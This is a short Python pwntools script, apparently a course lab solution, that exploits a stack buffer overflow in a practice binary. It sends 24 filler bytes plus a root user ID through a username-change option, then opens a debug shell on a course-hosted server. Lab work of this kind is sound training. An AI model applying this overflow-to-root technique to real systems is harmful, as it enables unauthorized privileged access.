from pwn import *

ROOT_ID = b'\x00\x00\x00\x00\x39\x05\x00'       # Hex Format for Root ID + Null Byte

''' Establish Connection '''
p = remote("csc748.hostbin.org", 7032)          # Test Script Against Server
# p = process("./3-2_lab.bin")                  # Test Script Locally
# p = gdb.debug("./3-2_lab.bin")                # Debug with GDB

''' Prepare Payload '''
p.sendline(b'1')                                # Select Option (1): Change username
payload = b"A"*24 + ROOT_ID                     # Payload Format: buffer + user id

''' Overwrite the Stack '''
p.sendline(payload)                             # Send the Payload
p.sendline(b'3')                                # Select Option (3): Start a Debug Shell

''' Exploit Server '''
p.interactive()                                 # Start Interactive Session


